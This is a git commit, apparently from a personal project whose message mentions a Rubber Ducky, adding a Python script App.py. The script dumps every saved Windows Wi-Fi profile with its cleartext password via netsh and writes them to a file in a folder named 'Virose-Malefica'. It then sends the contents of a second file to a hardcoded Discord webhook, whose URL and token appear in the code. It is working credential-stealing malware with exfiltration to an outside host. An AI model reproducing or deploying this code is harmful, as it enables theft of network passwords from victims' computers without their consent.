0ff13fb6d751b58e190596d56e9a5558be951105
Yuri Luis <71914185+yuriluisz@users.noreply.github.com>
2023-09-11 02:12:08 -0300

    Tudo pronto so falta o rubber ducker 1

---
+++ Functionx32/App.py
@@ -0,0 +1,39 @@
+import subprocess
+import datetime
+from discord_webhook import DiscordWebhook
+
+def get_networks():
+    information_command = subprocess.check_output("netsh wlan show profiles", encoding="cp858", shell=True)
+    networks = []
+    for line in information_command.split('\n'):
+        if "Todos os Perfis de Usuários" in line:
+            position = line.find(":")
+            network = line[position + 2:]
+            password = information_network(network)
+            networks.append("Nome = "+ network + " // Senha = " + password)
+    return networks
+
+def information_network(wifi):
+    information_command = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key", "=", "clear"],
+                                                  encoding="cp858", shell=True)
+    network = ''
+    for line in information_command.split('\n'):
+        if "Conteúdo da Chave" in line:
+            position = line.find(":")
+            network = line[position + 2:]
+            break
+    return network
+
+if __name__ == "__main__":
+    print(get_networks())
+
+dia = datetime.datetime.now()
+
+with open ("Virose-Malefica/senhas.txt", "w") as arquivos:
+    arquivos.write("As senhas do dia sao: {} // {} ".format(get_networks(),dia))
+
+with open ("Functionx32/Appsaves.txt", "r") as arquivoreader:
+    NetInject = arquivoreader.read()
+
+webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1150539523663605882/Z_AezEKC5gYw_TCE20canPY0qygZGIRYS4ia0EeATCZJwOoWtoARNdv-MFfUWqlVpNON", content="{}".format(NetInject))
+response = webhook.execute()
